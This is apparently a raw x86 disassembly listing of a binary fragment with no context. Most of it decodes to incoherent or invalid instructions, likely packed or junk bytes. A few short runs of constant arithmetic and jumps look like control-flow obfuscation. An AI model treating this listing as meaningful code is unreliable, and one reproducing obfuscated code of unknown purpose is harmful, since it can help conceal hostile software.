  419524:	adc    BYTE PTR [esi+eax*8+0x54],bh
  419528:	cmp    eax,0x6afc7f5a
  41952d:	xchg   ebp,eax
  41952e:	mov    ecx,0xc969719
  419533:	test   BYTE PTR [esi-0x64],al
  419536:	jne    0x4195b2
  419538:	fmul   DWORD PTR [ebx-0x1af9d86f]
  41953e:	pop    es
  41953f:	xor    al,0xa8
  419541:	aad    0x60
  419543:	in     al,dx
  419544:	sub    al,0x86
  419546:	adc    al,0x42
  419548:	add    ch,BYTE PTR [ebx-0x1e]
  41954b:	out    0xbd,eax
  41954d:	out    0x43,eax
  41954f:	mov    bl,0x48
  419551:	sbb    eax,DWORD PTR [ebp+0x13]
  419554:	jns    0x419565
  419556:	xor    DWORD PTR [ebx-0x5924cccb],edx
  41955c:	jmp    0x419570
  41955e:	jmp    0x4998e190
  419563:	cmp    al,dl
  419565:	repnz xchg edi,eax
  419567:	sbb    esp,edi
  419569:	aaa    
  41956a:	(bad)  
  41956b:	xchg   edi,eax
  41956c:	inc    eax
  41956d:	not    DWORD PTR [ebx]
  41956f:	gs (bad) 
  419571:	and    DWORD PTR [ecx-0x5d],edi
  419574:	fs xchg bh,ch
  419577:	mov    eax,0x61dcd4c5
  41957c:	sar    BYTE PTR [esi-0xa23004b],cl
  419582:	pop    es
  419583:	mov    eax,ds:0x232cda08
  419588:	adc    BYTE PTR [edi+0x6829be3c],0xf6
  41958f:	pop    ss
  419590:	xor    BYTE PTR [ebp+0x5d],ah
  419593:	adc    eax,0xf077578d
  419598:	and    DWORD PTR [ebp-0x32],edx
  41959b:	sahf   
  41959c:	in     eax,0xce
  41959e:	loop   0x419603
  4195a0:	sbb    al,BYTE PTR [ebp-0x106f4232]
  4195a6:	rol    BYTE PTR [edi],0xf6
  4195a9:	leave  
  4195aa:	ficom  WORD PTR [ecx]
  4195ac:	xchg   ecx,eax
  4195ad:	sbb    bl,bh
  4195af:	sub    BYTE PTR [ebx-0x7b],0x94
  4195b3:	lods   al,BYTE PTR ds:[esi]
  4195b4:	ja     0x419595
  4195b6:	aad    0x6e
  4195b8:	pop    ebx
  4195b9:	sbb    bl,bl
  4195bb:	ds inc ecx
  4195bd:	sub    BYTE PTR [edx],ch
  4195bf:	pop    ecx
  4195c0:	adc    esp,ecx
  4195c2:	push   ds
  4195c3:	mov    edx,0x13cb5e62
  4195c8:	or     eax,0x503a38de
  4195cd:	cli    
  4195ce:	sahf   
  4195cf:	inc    esp
  4195d0:	out    0xa4,eax
  4195d2:	retf   0xf512
  4195d5:	dec    ebx
  4195d6:	int    0xca
  4195d8:	cld    
  4195d9:	(bad)  [eax+0x3bf3b85]
  4195df:	aad    0x1a
  4195e1:	xchg   edx,eax
  4195e2:	sbb    eax,0x1e044d6b
  4195e7:	(bad)  
  4195e8:	jb     0x4195d2
  4195ea:	jecxz  0x41963d
  4195ec:	out    dx,eax
  4195ed:	cli    
  4195ee:	ins    BYTE PTR es:[edi],dx
  4195ef:	mul    DWORD PTR [ebp+0x62eb577d]
  4195f5:	jle    0x419626
  4195f7:	ret    0xcf7
  4195fa:	arpl   WORD PTR ds:0x22303e5,cx
  419600:	inc    edx
  419601:	daa    
  419602:	jb     0x41959b
  419604:	js     0x4195da
  419606:	imul   edi,DWORD PTR [ebx+eax*8-0x3d],0xffffffd8
  41960b:	dec    eax
  41960c:	repz aas 
  41960e:	push   ebp
  41960f:	out    0x58,al
  419611:	popf   
  419612:	cmp    edx,esp
  419614:	adc    cl,BYTE PTR [esi+0x2e]
  419617:	jg     0x419685
  419619:	scas   eax,DWORD PTR es:[edi]
  41961a:	fsubr  QWORD PTR ds:0x93cef3fa
  419620:	fcomp  DWORD PTR [edx]
  419622:	jl     0x41964e
  419624:	push   edi
  419625:	cld    
  419626:	and    DWORD PTR [edx+0xfd1a395],0x42750eda
  419630:	lea    ebx,[edx]
  419632:	mov    al,0x68
  419634:	js     0x4195ed
  419636:	sub    bl,dl
  419638:	ret    0x17c4
  41963b:	cmp    ebp,DWORD PTR [eax+0xb44891b]
  419641:	add    dl,BYTE PTR [edx+0x1177836d]
  419647:	push   ecx
  419648:	stos   BYTE PTR es:[edi],al
  419649:	adc    ch,BYTE PTR ds:0xbdc0bb67
  41964f:	shr    ebp,cl
  419651:	and    cl,dl
  419653:	das    
  419654:	in     al,dx
  419655:	scas   al,BYTE PTR es:[edi]
  419656:	or     cx,dx
  419659:	mov    edx,0x21a4
  41965e:	or     cx,dx
  419661:	mov    dx,WORD PTR [esp+0x2c]
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	mov    dl,0xe2
  419697:	cmp    BYTE PTR [edx-0x413ff655],dl
  41969d:	xor    eax,0x47bebec2
  4196a2:	data16 mov ds:0x22333adc,al
  4196a8:	inc    edx
  4196a9:	int    0xde
  4196ab:	adc    al,0xcb
  4196ad:	pop    ecx
  4196ae:	test   al,0x5e
  4196b1:	or     cl,BYTE PTR fs:[ebx+0x5a]
  4196b5:	xchg   DWORD PTR [ebp+0x3e],ebx
  4196b8:	mov    ecx,0xace7fef
  4196bd:	mov    esi,0xb53e9727
  4196c2:	and    ch,cl
  4196c4:	adc    al,dh
  4196c6:	repz clc 
  4196c8:	mov    edx,DWORD PTR [esp+eax*8]
  4196cb:	adc    BYTE PTR [esi],0x7
  4196ce:	(bad)  
  4196cf:	and    al,0x31
  4196d1:	in     al,dx
  4196d2:	jge    0x419717
  4196d4:	mov    dh,0xed
  4196d6:	lds    ecx,FWORD PTR [edi]
  4196d8:	push   es
  4196d9:	lods   eax,DWORD PTR ds:[esi]
  4196da:	scas   eax,DWORD PTR es:[edi]
  4196db:	adc    eax,0x7baea79d
  4196e0:	es (bad) 
  4196e2:	aad    0x13
  4196e4:	jp     0x419754
  4196e6:	sbb    al,BYTE PTR [ebx-0x752299c7]
  4196ec:	outs   dx,BYTE PTR ds:[esi]
  4196ed:	pop    ebx
  4196ee:	xor    ecx,DWORD PTR ds:0xeb2f9979
  4196f4:	jns    0x4196a3
  4196f6:	into   
  4196f7:	stos   BYTE PTR es:[edi],al
  4196f8:	or     esp,DWORD PTR [edi]
  4196fa:	jecxz  0x41971c
  4196fc:	mov    ebx,DWORD PTR [eax+0x6bc87950]
  419702:	outs   dx,BYTE PTR ds:[esi]
  419703:	sub    eax,0xb5e41851
  419708:	leave  
  419709:	mov    al,ds:0x30841580
  41970e:	fmul   st(0),st
  419710:	cmp    al,0xe2
  419712:	retf   0x2407
  419715:	test   al,0x8e
  419717:	jnp    0x419709
  419719:	fst    QWORD PTR [edx+0x73]
  41971c:	fwait
  41971d:	sbb    esi,ebp
  41971f:	and    eax,0x93adb743
  419724:	dec    BYTE PTR [edi+0x42]
  419727:	das    
  419728:	das    
  419729:	hlt    
  41972a:	sbb    DWORD PTR [edx+eax*2-0x6ce61d97],edi
  419731:	xchg   ecx,eax
  419732:	mov    edx,0xcee74d4e
  419737:	gs pushf 
  419739:	adc    esi,DWORD PTR [eax]
  41973b:	jns    0x419752
  41973d:	loopne 0x419793
  41973f:	push   esp
  419740:	push   0x8c653e21
  419745:	in     eax,0x29
  419747:	dec    eax
  419748:	xor    ebx,DWORD PTR [edi+eax*4+0x7bf4b3b2]
  41974f:	cs pusha 
  419751:	sbb    al,0xb2
  419753:	jne    0x419720
  419755:	adc    al,0x90
  419757:	loope  0x41979a
  419759:	jnp    0x419770
  41975b:	and    al,0x57
  41975d:	push   0x6
  41975f:	pop    eax
  419760:	outs   dx,DWORD PTR ds:[esi]
  419761:	mov    edi,0x470369c4
  419766:	sbb    eax,0xe7debea0
  41976b:	sub    DWORD PTR [ebx],ebp
  41976d:	sub    DWORD PTR [edi+0x0],esi
  419770:	enter  0x1346,0xf0
  419774:	rcl    dh,cl
  419776:	and    cl,BYTE PTR [eax-0x1]
  419779:	stc    
  41977a:	cmp    al,dl
  41977c:	rcl    edx,cl
  41977e:	int3   
  41977f:	iret   
  419780:	(bad)  
  419781:	jnp    0x4197a7
  419783:	imul   ebp,DWORD PTR [ebx],0xfffffffa
  419786:	mov    al,0x95
  419788:	mov    ebx,0xd10c3a70
  41978d:	add    al,0x2b
  41978f:	iret   
  419790:	aad    0x21
  419792:	in     eax,dx
  419793:	outs   dx,DWORD PTR ds:[esi]
  419794:	sbb    eax,0x2a65c81c
  419799:	dec    esp
  41979a:	fwait
  41979b:	in     al,0x76
  41979d:	call   0x4ba9:0x4639cf0
  4197a4:	adc    eax,DWORD PTR [esi]
  4197a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197a7:	adc    BYTE PTR [eax+0x37],cl
  4197aa:	das    
  4197ab:	inc    ecx
  4197ac:	jge    0x419743
  4197ae:	push   ebp
  4197b0:	or     BYTE PTR [esi-0x1347f0b9],cl
  4197b6:	fwait
  4197b7:	xor    BYTE PTR [edx],cl
  4197b9:	pop    ecx
  4197ba:	cmp    ebp,DWORD PTR [esi-0x23]
  4197bd:	pop    edi
  4197be:	push   ecx
  4197bf:	pop    es
  4197c0:	jle    0x419825
  4197c2:	mul    ebx
  4197c4:	call   0x8f77:0xdeb1501b
  4197cb:	sar    ebp,1
  4197cd:	pop    ss
  4197ce:	(bad)  
  4197cf:	in     al,dx
  4197d0:	shl    DWORD PTR [edx-0x7638017f],cl
  4197d6:	pushw  ss
  4197d8:	outs   dx,DWORD PTR ds:[esi]
  4197d9:	sub    BYTE PTR [edi],dl
  4197db:	pop    ss
  4197dc:	push   edx
  4197dd:	and    edx,DWORD PTR [ecx+0x32]
  4197e0:	fadd   QWORD PTR [edx+edx*1-0x7c3169f5]
  4197e7:	ins    BYTE PTR es:[edi],dx
  4197e8:	bound  ecx,QWORD PTR [ebx]
  4197ea:	cmp    dh,ch
  4197ec:	dec    eax
  4197ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ee:	iret   
  4197ef:	pop    esi
  4197f0:	inc    ecx
  4197f1:	fldcw  WORD PTR [ecx+esi*4+0x41]
  4197f5:	jp     0x41978c
  4197f7:	or     BYTE PTR [ecx],bl
  4197f9:	dec    ecx
  4197fa:	leave  
  4197fb:	mov    ?,WORD PTR [ebp+0xd]
  4197fe:	push   cs
  4197ff:	add    ebx,DWORD PTR [eax+0x1]
  419802:	popf   
  419803:	mov    eax,0xf2519763
  419808:	xchg   ebx,eax
  419809:	adc    eax,0x3be77171
  41980e:	cmp    eax,0x31290e98
  419813:	xchg   BYTE PTR [edx-0x6b],dl
  419816:	in     eax,dx
  419817:	sub    eax,DWORD PTR [esi]
  419819:	mov    BYTE PTR [edi-0x2d7aa113],ah
  41981f:	nop
  419820:	push   ecx
  419821:	lods   eax,DWORD PTR ds:[esi]
  419822:	mov    eax,0x560477ee
  419827:	les    edi,FWORD PTR ds:[esi-0x39]
  41982b:	mov    ds:0x21617d2c,al
  419830:	or     al,BYTE PTR [eax-0x26d966ce]
  419836:	mov    al,ds:0xaf6a5c32
  41983b:	mov    ebx,esi
  41983d:	sub    eax,0x305886e8
  419842:	dec    edx
  419843:	sahf   
  419844:	aam    0x76
  419846:	fs scas al,BYTE PTR es:[edi]
  419848:	fwait
  419849:	jl     0x41984f
  41984b:	sar    ch,0x6
  41984e:	(bad)  
  41984f:	repz ja 0x41989a
  419852:	cli    
  419853:	and    al,0x75
  419855:	fdivr  QWORD PTR [ebx+0x3b]
  419858:	mul    DWORD PTR [ebx+0x21]
  41985b:	mov    DWORD PTR [esi-0x4a],esi
  41985e:	(bad)  
  41985f:	jmp    0x10729687
  419864:	ja     0x419840
  419866:	add    DWORD PTR [edi],esp
  419868:	mov    ebp,0xabf94890
  41986d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986e:	mov    ebp,0x8ce8fb64
  419873:	out    dx,al
  419874:	xor    esi,DWORD PTR [ebp+0x6a839709]
  41987a:	mov    fs,eax
  41987c:	pop    ebp
  41987d:	in     al,dx
  41987e:	outs   dx,DWORD PTR ds:[esi]
  41987f:	and    eax,0x3aac8378
  419884:	push   ds
  419885:	shr    edi,1
  419887:	mov    ebx,gs
  419889:	scas   eax,DWORD PTR es:[edi]
  41988a:	cmc    
  41988b:	cld    
  41988c:	inc    ebp
  41988d:	mov    esp,0x9063cccd
  419892:	daa    
  419893:	scas   al,BYTE PTR es:[edi]
  419894:	(bad)  
  419895:	cmc    
  419896:	dec    edi
  419897:	(bad)  
  419899:	add    al,0x24
  41989b:	mov    ds:0x90c32722,al
  4198a0:	ins    BYTE PTR es:[edi],dx
  4198a1:	out    0xe7,eax
  4198a3:	cmp    dh,BYTE PTR [ebx]
  4198a5:	xor    ebx,eax
  4198a7:	pop    ebp
  4198a8:	mov    BYTE PTR [esi-0x60],dh
  4198ab:	dec    ebp
  4198ac:	mov    edi,0x523cf68a
  4198b1:	in     al,0xb5
  4198b3:	mov    bl,BYTE PTR [esi+0x691a2598]
  4198b9:	fst    QWORD PTR ds:0xe699398d
  4198bf:	int    0xbf
  4198c1:	and    DWORD PTR [esi+0x17],edx
  4198c4:	adc    eax,0x5596f661
  4198c9:	push   ebp
  4198ca:	or     DWORD PTR [edi+eax*4],ebp
  4198cd:	and    dh,dh
  4198cf:	cmp    DWORD PTR [ebx-0x3c],esi
  4198d2:	fild   WORD PTR [edx-0x168aa05c]
  4198d8:	xlat   BYTE PTR ds:[ebx]
  4198d9:	cdq    
  4198da:	jmp    0x4198ae
  4198dc:	cli    
  4198dd:	sub    eax,DWORD PTR [esi]
  4198df:	mov    cl,0x8c
  4198e1:	mov    WORD PTR [esp+0x24],cx
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	jbe    0x41991a
  419918:	dec    edx
  419919:	xchg   edx,eax
  41991a:	and    al,0xd
  41991c:	sar    BYTE PTR [esi-0x41413dcb],0x78
  419923:	out    0xf5,al
  419925:	fimul  DWORD PTR [esi]
  419927:	adc    ebp,eax
  419929:	or     ah,BYTE PTR [esi+0x3315a0d6]
  41992f:	cmp    DWORD PTR [ebx+0x6b30466d],esi
  419935:	inc    edi
  419936:	hlt    
  419937:	jmp    0xde4f:0x96be55f4
  41993e:	retf   
  41993f:	fcmovnu st,st(1)
  419941:	push   esp
  419942:	xor    eax,0x7c66f091
  419947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419948:	push   edi
  419949:	sbb    al,0x9
  41994b:	ds jmp 0x419900
  41994e:	outs   dx,BYTE PTR ds:[esi]
  41994f:	call   0x1c9d9dbe
  419954:	add    eax,0xd9daa0d
  419959:	sbb    esp,DWORD PTR [ebx+edx*8+0x502d58c0]
  419960:	fsubr  DWORD PTR [edi-0x29]
  419963:	sub    dl,bh
  419965:	sbb    DWORD PTR [ebx],edi
  419967:	fs xchg edx,eax
  419969:	out    dx,al
  41996a:	pop    esp
  41996b:	(bad)  
  41996d:	imul   esi,DWORD PTR [eax-0x6a634741],0x75125872
  419977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419978:	in     eax,0x38
  41997a:	xor    ah,BYTE PTR [ebp+0x7e]
  41997d:	pop    ecx
  41997e:	add    edx,DWORD PTR [eax-0x116a2aac]
  419984:	fistp  WORD PTR [eax+esi*4-0x600f310c]
  41998b:	mul    DWORD PTR [esi-0x21613687]
  419991:	adc    BYTE PTR [edi-0x63cc809],0x86
  419998:	ds inc eax
  41999a:	mov    esi,0x7de6ab9c
  41999f:	wbinvd 
  4199a1:	sub    eax,0x49166c95
  4199a6:	mov    ah,bh
  4199a8:	aaa    
  4199a9:	inc    esp
  4199aa:	xchg   esp,eax
  4199ab:	lods   eax,DWORD PTR ds:[esi]
  4199ac:	in     eax,dx
  4199ad:	lods   al,BYTE PTR ds:[esi]
  4199ae:	or     al,0xb
  4199b0:	xchg   ebp,eax
  4199b1:	push   ss
  4199b2:	scas   al,BYTE PTR es:[edi]
  4199b3:	shl    BYTE PTR [ebx+0x509a900],0xe9
  4199ba:	sub    eax,edx
  4199bc:	ins    DWORD PTR es:[edi],dx
  4199bd:	push   es
  4199be:	sub    dl,ah
  4199c0:	daa    
  4199c1:	int    0x35
  4199c3:	pop    ebp
  4199c4:	cmc    
  4199c5:	push   ebx
  4199c6:	sbb    eax,0x2ebe62df
  4199cb:	and    al,0xa3
  4199cd:	fiadd  WORD PTR [ebp+0x13191ea7]
  4199d3:	jmp    0x9c13:0xe47b140
  4199da:	das    
  4199db:	xlat   BYTE PTR es:[ebx]
  4199dd:	mov    ebp,esi
  4199df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199e0:	fnstenv [ebp-0x4]
  4199e3:	int    0xd0
  4199e5:	popaw  
  4199e7:	(bad)  
  4199e8:	lds    esp,FWORD PTR [edi]
  4199ea:	mov    bh,0x22
  4199ec:	sub    ecx,DWORD PTR [esi-0x6a823f57]
  4199f2:	int    0xb2
  4199f4:	mov    bl,0x8f
  4199f6:	mov    ebx,0x85fefe19
  4199fb:	(bad)  
  4199fc:	repz repnz sbb al,ah
  419a00:	dec    ecx
  419a01:	pop    es
  419a02:	imul   ecx,DWORD PTR ds:0xb1c690d9,0x70
  419a09:	out    0x84,al
  419a0b:	adc    al,BYTE PTR [ecx-0xf283d94]
  419a11:	xor    eax,0xb53c162b
  419a16:	ja     0x4199d5
  419a18:	xchg   edi,eax
  419a19:	ret    
  419a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a1b:	imul   esp,DWORD PTR [eax],0x56
  419a1e:	jbe    0x419a38
  419a20:	jle    0x419a35
  419a22:	pop    edx
  419a23:	jecxz  0x419a9c
  419a25:	sub    BYTE PTR [edx-0x6860d5f0],bl
  419a2b:	push   ss
  419a2c:	add    dh,BYTE PTR [esi+0x16]
  419a2f:	es std 
  419a31:	push   edi
  419a32:	adc    ch,BYTE PTR [edx]
  419a34:	cmp    ecx,DWORD PTR [edx-0x6b]
  419a37:	stos   BYTE PTR es:[edi],al
  419a38:	test   eax,0x95223643
  419a3d:	push   ds
  419a3e:	mov    DWORD PTR [edi],0xddf7295c
  419a44:	pop    esp
  419a45:	pop    esi
  419a46:	hlt    
  419a47:	dec    bp
  419a49:	test   al,0x8d
  419a4b:	sbb    dl,BYTE PTR [esi]
  419a4d:	fadd   DWORD PTR [ebx+0x1b08b1a6]
  419a53:	push   0x1abe1829
  419a58:	jne    0x419ac1
  419a5a:	xchg   esp,eax
  419a5b:	inc    edx
  419a5c:	aam    0x40
  419a5e:	ja     0x419a73
  419a60:	dec    eax
  419a61:	mov    al,0xd1
  419a63:	mov    bl,0xf4
  419a65:	test   esp,esp
  419a67:	mov    ebx,0x3f74e25f
  419a6c:	adc    esi,edi
  419a6e:	(bad)  
  419a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a70:	es int 0xc8
  419a73:	dec    ecx
  419a74:	imul   ecx,DWORD PTR ds:0x202ae181,0xa43ae555
  419a7e:	inc    edi
  419a7f:	loopne 0x419a42
  419a81:	cmc    
  419a82:	xchg   BYTE PTR ds:0xeed4c028,bl
  419a88:	icebp  
  419a89:	fdiv   DWORD PTR ds:0x7ef9298e
  419a8f:	dec    esp
  419a90:	ficom  WORD PTR ds:0x80a55e90
  419a96:	dec    edx
  419a97:	retf   
  419a98:	xchg   ebp,eax
  419a99:	cmp    bh,cl
  419a9b:	push   es
  419a9c:	dec    eax
  419a9d:	hlt    
  419a9e:	imul   BYTE PTR [esi-0x3bc7903b]
  419aa4:	retf   
  419aa5:	jae    0x419a80
  419aa7:	loop   0x419a86
  419aa9:	xchg   esp,eax
  419aaa:	pushf  
  419aab:	mov    eax,0x153280f
  419ab0:	sub    DWORD PTR [edi],ebx
  419ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ab3:	retf   
  419ab4:	clc    
  419ab5:	xchg   ecx,eax
  419ab6:	mov    dl,0xd6
  419ab8:	aam    0x8d
  419aba:	mov    bl,0x3
  419abc:	sub    al,bh
  419abe:	push   esi
  419abf:	(bad)  
  419ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac1:	pushf  
  419ac2:	jno    0x419b3a
  419ac4:	xor    ch,BYTE PTR [ecx]
  419ac6:	mov    ds:0x197ad3ec,eax
  419acb:	lahf   
  419acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419acd:	jns    0x419a7f
  419acf:	cmp    DWORD PTR [eax+0x35],eax
  419ad2:	fmul   st,st(6)
  419ad4:	and    BYTE PTR ds:0xa9d2427a,ah
  419ada:	adc    DWORD PTR [ebx],ecx
  419adc:	(bad)  
  419add:	xor    eax,ecx
  419adf:	and    eax,0x2090086a
  419ae4:	popa   
  419ae5:	inc    ecx
  419ae6:	sbb    eax,0x2f4fd3e1
  419aeb:	push   esi
  419aec:	mov    ?,edi
  419aee:	jo     0x419b30
  419af0:	mov    dh,0x7d
  419af2:	out    0x96,eax
  419af4:	fs lock enter 0x8bf8,0xf6
  419afa:	cli    
  419afb:	xor    BYTE PTR [ebp+0x47],dh
  419afe:	sbb    ebp,ecx
  419b00:	mov    eax,ds:0x32310a46
  419b05:	mov    esi,0x414cd833
  419b0a:	mov    ecx,0x8566cfeb
  419b0f:	std    
  419b10:	das    
  419b11:	adc    BYTE PTR [eax-0x5b585095],0x36
  419b18:	cmp    dh,cl
  419b1a:	mov    eax,0xffaf65ef
  419b1f:	xor    DWORD PTR [edx-0x68],ebp
  419b22:	shl    BYTE PTR [ecx+0x60],0x4a
  419b26:	test   ah,dl
  419b28:	rcr    BYTE PTR [edx-0x6ad524d],0xb9
  419b2f:	mov    fs,WORD PTR [edx-0x7d]
  419b32:	gs stos DWORD PTR es:[edi],eax
  419b34:	jge    0x419b8a
  419b36:	dec    ebp
  419b37:	cmp    ch,ah
  419b39:	out    0xa5,eax
  419b3b:	dec    ebx
  419b3c:	repz aam 0x52
  419b3f:	mov    esi,0xf3b51c2b
  419b44:	sbb    DWORD PTR ds:0x7f34cce9,ebx
  419b4a:	not    DWORD PTR [eax-0xc]
  419b4d:	loopne 0x419b2f
  419b4f:	cmc    
  419b50:	fcmovb st,st(5)
  419b52:	mov    BYTE PTR gs:[ebp+0x3],ah
  419b56:	fs jp  0x419ae6
  419b59:	fidivr WORD PTR [edx+0x37]
  419b5c:	mov    dl,0xf3
  419b5e:	mov    dh,0x60
  419b60:	adc    esp,DWORD PTR [esi-0x46]
  419b63:	ficom  WORD PTR [eax]
  419b65:	add    BYTE PTR [eax],al
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	fst    QWORD PTR [esi]
  419bbb:	bound  ebx,QWORD PTR [esi-0x413fee64]
  419bc1:	xor    eax,0x98bebec2
  419bc6:	pop    ss
  419bc7:	push   ebp
  419bc8:	mov    esp,esp
  419bca:	(bad)  
  419bcb:	pop    eax
  419bcc:	dec    ebx
  419bcd:	cwde   
  419bce:	adc    ebp,DWORD PTR [esp+edx*1+0x1d31f1c0]
  419bd5:	cwde   
  419bd6:	push   ebp
  419bd7:	or     eax,0x1a001d10
  419bdc:	dec    edi
  419bdd:	rcr    BYTE PTR [ebx],cl
  419bdf:	cmp    bh,BYTE PTR [esi]
  419be1:	es inc eax
  419be3:	mov    esp,ds
  419be5:	pushf  
  419be6:	jge    0x419c50
  419be8:	inc    ecx
  419be9:	adc    DWORD PTR [ebx+ebx*2],eax
  419bec:	cld    
  419bed:	sub    al,BYTE PTR [ecx]
  419bef:	lea    ebp,[edx-0x2c]
  419bf2:	iret   
  419bf3:	call   0x1008e1a5
  419bf8:	xor    ah,al
  419bfa:	ja     0x419c5c
  419bfc:	shl    DWORD PTR [edi+eiz*4],0x47
  419c00:	mov    edi,0xa8da1e9b
  419c05:	lahf   
  419c06:	das    
  419c07:	rol    bh,0x9a
  419c0a:	adc    eax,0xf950c688
  419c0f:	push   eax
  419c10:	int    0xf5
  419c12:	and    ebx,DWORD PTR [ebx]
  419c14:	cmp    DWORD PTR [ebx-0x37],edx
  419c17:	leave  
  419c18:	push   esi
  419c19:	outs   dx,DWORD PTR ds:[esi]
  419c1a:	dec    eax
  419c1b:	in     eax,dx
  419c1c:	add    eax,0xe4791942
  419c21:	out    0xee,eax
  419c23:	aad    0x4a
  419c25:	shr    dh,0xf
  419c28:	mov    al,ds:0x1b109d04
  419c2d:	sub    ch,dl
  419c2f:	lods   al,BYTE PTR ds:[esi]
  419c30:	jl     0x419c84
  419c32:	push   ecx
  419c33:	cs jecxz 0x419be8
  419c36:	call   0xf068c68
  419c3b:	jmp    ecx
  419c3d:	mov    bh,0xf1
  419c3f:	les    edx,FWORD PTR [ebp+edx*2+0x13]
  419c43:	and    ecx,DWORD PTR ds:[edx-0x2f8c17c1]
  419c4a:	in     al,0x41
  419c4c:	pushf  
  419c4d:	es mov bl,0x41
  419c50:	mov    edx,0xc8320c19
  419c55:	popa   
  419c56:	xor    ebx,ebp
  419c58:	sub    ch,0xd4
  419c5b:	ror    BYTE PTR [edi],cl
  419c5d:	sbb    al,0x57
  419c5f:	jle    0x419c38
  419c61:	cmp    al,0x8
  419c63:	pop    es
  419c64:	fidiv  WORD PTR [eax-0x3783a218]
  419c6a:	cli    
  419c6b:	pop    edi
  419c6c:	push   ebx
  419c6d:	fisttp QWORD PTR [eax-0x29]
  419c70:	fs cdq 
  419c72:	mov    ch,0xd0
  419c74:	xchg   esp,eax
  419c75:	test   al,0x80
  419c77:	mov    ch,0x1c
  419c79:	add    BYTE PTR [esi],ah
  419c7b:	sahf   
  419c7c:	adc    edx,DWORD PTR [ecx+esi*8]
  419c7f:	xor    DWORD PTR [edx-0x5e8d7c56],ebp
  419c85:	jg     0x419c52
  419c87:	ss add cl,bl
  419c8a:	outs   dx,BYTE PTR ds:[esi]
  419c8b:	bound  ecx,QWORD PTR [ebp-0x41]
  419c8e:	in     eax,0xa8
  419c90:	outs   dx,BYTE PTR ds:[esi]
  419c91:	xor    ecx,ecx
  419c93:	mov    edx,0xa888185c
  419c98:	inc    ebp
  419c99:	mov    eax,0x596876b0
  419c9e:	dec    edi
  419c9f:	inc    ebx
  419ca0:	fnstenv [ebx+0x48]
  419ca3:	jae    0x419d13
  419ca5:	push   es
  419ca6:	jns    0x419c42
  419ca8:	call   0x9947:0x9171ec20
  419caf:	inc    edx
  419cb0:	jle    0x419c3f
  419cb2:	sahf   
  419cb3:	jne    0x419c71
  419cb5:	or     edx,esp
  419cb7:	repz xchg esp,eax
  419cb9:	(bad)  
  419cba:	jb     0x419ce0
  419cbc:	cld    
  419cbd:	bound  esi,QWORD PTR ds:0x17e16f01
  419cc3:	outs   dx,BYTE PTR ds:[esi]
  419cc4:	sbb    DWORD PTR [eax-0x6e],0x4cfb2312
  419ccb:	outs   dx,BYTE PTR ds:[esi]
  419ccc:	int3   
  419ccd:	ins    BYTE PTR es:[edi],dx
  419cce:	push   0x6a
  419cd0:	je     0x419ce7
  419cd2:	cld    
  419cd3:	shr    BYTE PTR [ebp+0x3a],cl
  419cd6:	mov    WORD PTR [ebx+0x1f],ss
  419cd9:	out    0xd4,eax
  419cdb:	xor    DWORD PTR ds:0x9b44c5b3,esp
  419ce1:	gs test al,0x37
  419ce4:	cmp    dh,cl
  419ce6:	int3   
  419ce7:	out    dx,al
  419ce8:	popf   
  419ce9:	cmp    BYTE PTR [ebp+0x71],bh
  419cec:	jg     0x419ce5
  419cee:	mov    esi,0x87d8498b
  419cf3:	push   ebp
  419cf4:	cmp    eax,0xcd1ff85c
  419cf9:	xor    BYTE PTR ds:0xd378bc7e,dh
  419cff:	xlat   BYTE PTR ds:[ebx]
  419d00:	ins    BYTE PTR es:[edi],dx
  419d01:	outs   dx,DWORD PTR ds:[esi]
  419d02:	xor    eax,DWORD PTR [esi-0x7114ed0c]
  419d08:	or     edi,esp
  419d0a:	aaa    
  419d0b:	outs   dx,BYTE PTR ds:[esi]
  419d0c:	mov    ds:0x75a70b84,al
  419d11:	ds loop 0x419c97
  419d14:	push   ecx
  419d15:	pop    ss
  419d16:	push   ebx
  419d17:	inc    eax
  419d18:	in     al,0xb9
  419d1a:	aad    0x17
  419d1c:	pop    ds
  419d1d:	push   0x5b2065f9
  419d22:	xlat   BYTE PTR ds:[ebx]
  419d23:	xor    BYTE PTR [edx-0x67],ch
